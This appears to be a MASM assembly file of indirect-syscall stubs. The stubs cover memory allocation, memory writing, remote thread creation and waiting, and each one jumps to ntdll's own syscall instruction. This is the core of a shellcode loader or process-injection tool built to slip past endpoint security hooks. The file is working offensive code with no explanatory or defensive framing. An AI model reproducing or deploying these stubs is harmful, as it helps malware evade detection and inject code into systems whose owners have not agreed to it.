; Assembly stubs for each syscall
; Each proc loads the SSN into EAX, moves RCX into R10,
; then jumps to the syscall instruction address inside ntdll.

EXTERN wNtAllocateVirtualMemory:DWORD
EXTERN sysAddrNtAllocateVirtualMemory:QWORD

EXTERN wNtWriteVirtualMemory:DWORD
EXTERN sysAddrNtWriteVirtualMemory:QWORD

EXTERN wNtCreateThreadEx:DWORD
EXTERN sysAddrNtCreateThreadEx:QWORD

EXTERN wNtWaitForSingleObject:DWORD
EXTERN sysAddrNtWaitForSingleObject:QWORD

.code

; ----------------------------------------------
; allocate()
; NTSTATUS NtAllocateVirtualMemory(...)
allocate PROC
    mov     r10, rcx                          ; RCX ? R10 (required for syscall ABI)
    mov     eax, wNtAllocateVirtualMemory     ; Load SSN for NtAllocateVirtualMemory
    jmp     QWORD PTR [sysAddrNtAllocateVirtualMemory] ; Jump to ntdll's syscall
allocate ENDP

; ----------------------------------------------
; writeMem()
; NTSTATUS NtWriteVirtualMemory(...)
writeMem PROC
    mov     r10, rcx
    mov     eax, wNtWriteVirtualMemory
    jmp     QWORD PTR [sysAddrNtWriteVirtualMemory]
writeMem ENDP

; ----------------------------------------------
; createThread()
; NTSTATUS NtCreateThreadEx(...)
createThread PROC
    mov     r10, rcx
    mov     eax, wNtCreateThreadEx
    jmp     QWORD PTR [sysAddrNtCreateThreadEx]
createThread ENDP

; ----------------------------------------------
; waitFor()
; NTSTATUS NtWaitForSingleObject(...)
waitFor PROC
    mov     r10, rcx
    mov     eax, wNtWaitForSingleObject
    jmp     QWORD PTR [sysAddrNtWaitForSingleObject]
waitFor ENDP

END
